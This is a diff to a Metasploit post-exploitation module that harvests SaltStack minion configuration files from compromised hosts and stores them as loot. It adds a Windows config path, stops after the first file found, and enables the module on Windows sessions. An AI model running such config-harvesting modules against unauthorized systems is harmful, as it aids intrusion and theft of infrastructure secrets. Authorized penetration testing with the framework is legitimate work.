@@ -176,8 +176,9 @@ class MetasploitModule < Msf::Post
     print_status('Looking for salt minion config files')
     # https://github.com/saltstack/salt/blob/b427688048fdbee106f910c22ebeb105eb30aa10/doc/ref/configuration/minion.rst#configuring-the-salt-minion
     [
-      '/usr/local/etc/salt/minion', # freebsd
-      '/etc/salt/minion'
+      '/etc/salt/minion', # linux, osx
+      'C://salt//conf//minion',
+      '/usr/local/etc/salt/minion' # freebsd
     ].each do |config|
       next unless file?(config)
 
@@ -187,6 +188,7 @@ class MetasploitModule < Msf::Post
       end
       store_path = store_loot('saltstack_minion', 'application/x-yaml', session, minion.to_yaml, 'minion.yaml', 'SaltStack Minion File')
       print_good("#{peer} - minion file successfully retrieved and saved to #{store_path}")
+      break # no need to process more
     end
   end
 
@@ -289,7 +291,8 @@ class MetasploitModule < Msf::Post
 
   def run
     if session.platform == 'windows'
-      fail_with(Failure::Unknown, 'This module does not support windows')
+      # the docs dont show that you can run as a master, nor was the master .bat included as of this writing
+      minion
     end
     minion if command_exists?('salt-minion')
     master if command_exists?('salt-master')
